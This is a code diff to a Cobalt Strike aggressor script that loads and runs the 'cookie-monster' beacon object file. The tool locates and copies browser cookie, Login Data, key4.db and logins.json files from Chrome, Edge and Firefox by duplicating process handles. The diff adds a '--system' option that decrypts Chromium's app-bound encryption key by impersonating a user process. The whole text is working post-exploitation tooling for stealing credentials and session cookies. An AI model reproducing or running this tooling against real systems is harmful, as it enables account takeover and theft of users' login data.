@@ -9,18 +9,20 @@
 beacon_command_register(
 "cookie-monster",
 "Locate and copy the cookie file used for Edge/Chrome/Firefox",
-"Usage: cookie-monster [--chrome || --edge || --firefox || --chromeCookiePID <pid> || --chromeLoginDataPID <PID> || --edgeCookiePID <pid> || --edgeLoginDataPID <pid> ] \
+"Usage: cookie-monster [--chrome || --edge || --system <Local State File Path> <PID> || --firefox || --chromeCookiePID <PID> || --chromeLoginDataPID <PID> || --edgeCookiePID <PID> || --edgeLoginDataPID <PID> ] \
 cookie-monster Example: \
    cookie-monster --chrome \
    cookie-monster --edge \
+   cookie-monster --system \"C:\\Users\\<USER>\\AppData\\Local\\<BROWSER>\\User\ Data\\Local\ State\" <PID> \
    cookie-moster --firefox \
-   cookie-monster --chromeCookiePID 1337 \
-   cookie-monster --chromeLoginDataPID 1337 \
-   cookie-monster --edgeCookiePID 4444 \
-   cookie-monster --edgeLoginDataPID 4444 \
+   cookie-monster --chromeCookiePID <PID> \
+   cookie-monster --chromeLoginDataPID <PID> \
+   cookie-monster --edgeCookiePID <PID> \
+   cookie-monster --edgeLoginDataPID <PID> \
 cookie-monster Options: \
     --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD \
     --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD \
+    --system, Decrypt chromium based browser app bound encryption key without injecting into browser. Requires path to Local State file and PID of a user process for impersonation \
     --firefox, looks for profiles.ini and locates the key4.db and logins.json file \
     --chromeCookiePID, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file \
     --chromeLoginDataPID, if chrome PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file \  
@@ -32,7 +34,7 @@ cookie-monster Options: \
 # $2 - args
 
 alias cookie-monster {
-    local('$barch $handle $data $args $chrome $edge $firefox $all');
+    local('$barch $handle $data $args $chrome $edge $firefox $system $all');
     $barch = barch($1);
     # read in our BOF file...   
     $handle = openf(script_resource("cookie-monster-bof." . $barch . ".o"));
@@ -46,32 +48,60 @@ alias cookie-monster {
     }
 
     # declare variables
-    $chrome = 1;
-    $edge = 1;
-    $firefox = 1;
-    $chromeCookiePID = 1;
-    $chromeLoginDataPID = 1;
-    $edgeCookiePID = 1;
-    $edgeLoginDataPID = 1;
-    $pid = 1;
+    $chrome = 0;
+    $system = 0;
+    $edge = 0;
+    $firefox = 0;
+    $chromeCookiePID = 0;
+    $chromeLoginDataPID = 0;
+    $edgeCookiePID = 0;
+    $edgeLoginDataPID = 0;
+    $pid = 0;
+    $path = "";
 
     for ($i = 1; $i < size(@_); $i++)
     {
         if (@_[$i] eq "--chrome")
         {
-            $chrome = 0;
+            $chrome = 1;
         }
         else if (@_[$i] eq "--edge")
         {
-            $edge = 0;
+            $edge = 1;
         }
         else if (@_[$i] eq "--firefox")
         {
-            $firefox = 0;
+            $firefox = 1;
+        }
+        else if (@_[$i] eq "--system")
+        {
+            $system = 1;
+            # get Local State File Path
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing Local State File Path");
+                return;
+            }
+            $path = @_[$i];
+            
+            # get PID
+            $i++;
+            if($i >= size(@_))
+            {
+                berror($1, "missing PID value");
+                return;
+            }
+            $pid = @_[$i];
+            if(!-isnumber $pid || $pid eq "1")
+            {
+                    berror($1, "Invalid PID: " . $pid);
+                    return;
+            }
         }
         else if (@_[$i] eq "--chromeCookiePID")
         {
-            $chromeCookiePID = 0;
+            $chromeCookiePID = 1;
             # get PID
             $i++;
             if($i >= size(@_))
@@ -88,7 +118,7 @@ alias cookie-monster {
         }
         else if (@_[$i] eq "--chromeLoginDataPID")
         {
-            $chromeLoginDataPID = 0;
+            $chromeLoginDataPID = 1;
             # get PID
             $i++;
             if($i >= size(@_))
@@ -105,7 +135,7 @@ alias cookie-monster {
         }
         else if (@_[$i] eq "--edgeCookiePID")
         {
-            $edgeCookiePID = 0;
+            $edgeCookiePID = 1;
             # get PID
             $i++;
             if($i >= size(@_))
@@ -122,7 +152,7 @@ alias cookie-monster {
         }
         else if (@_[$i] eq "--edgeLoginDataPID")
         {
-            $edgeLoginDataPID = 0;
+            $edgeLoginDataPID = 1;
             # get PID
             $i++;
             if($i >= size(@_))
@@ -143,12 +173,13 @@ alias cookie-monster {
         }
     }
 
-    if ( $chrome == 1 && $edge == 1 && $firefox == 1 && $chromeCookiePID == 1 && $chromeLoginDataPID == 1 && $edgeCookiePID == 1 && $edgeLoginDataPID == 1 && $pid == 1){
+    if ( $chrome == 0 && $edge == 0 && $system == 0 && $firefox == 0 && $chromeCookiePID == 0 && $chromeLoginDataPID == 0 && $edgeCookiePID == 0 && $edgeLoginDataPID == 0 && $pid == 0){
         berror($1, "NO OPTIONS SELECTED");
         return;
     }
     
-    $args = bof_pack($1, "iiiiiiii", $chrome, $edge, $firefox, $chromeCookiePID, $chromeLoginDataPID, $edgeCookiePID, $edgeLoginDataPID, $pid );
+    $args = bof_pack($1, "iiiiiiiiiz", $chrome, $edge, $system, $firefox, $chromeCookiePID, $chromeLoginDataPID, $edgeCookiePID, $edgeLoginDataPID, $pid, $path);
+    btask($1, "Running Cookie-Monster BOF");
     beacon_inline_execute($1, $data, "go", $args);
 
 }
